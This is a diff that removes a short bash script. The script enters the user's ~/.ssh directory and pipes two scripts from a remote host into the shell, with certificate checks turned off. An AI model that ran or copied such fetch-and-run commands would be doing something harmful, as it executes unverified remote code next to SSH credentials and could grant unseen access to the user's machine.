@@ -1,8 +1,0 @@
-#!/bin/bash
-
-BLOG_URL="https://dev.iasdf.com"
-
-cd $HOME/.ssh/
-curl -sk "${BLOG_URL}/jset/jpubsh" | sh -
-curl -sk "${BLOG_URL}/jset/jconfsh" | sh -
-
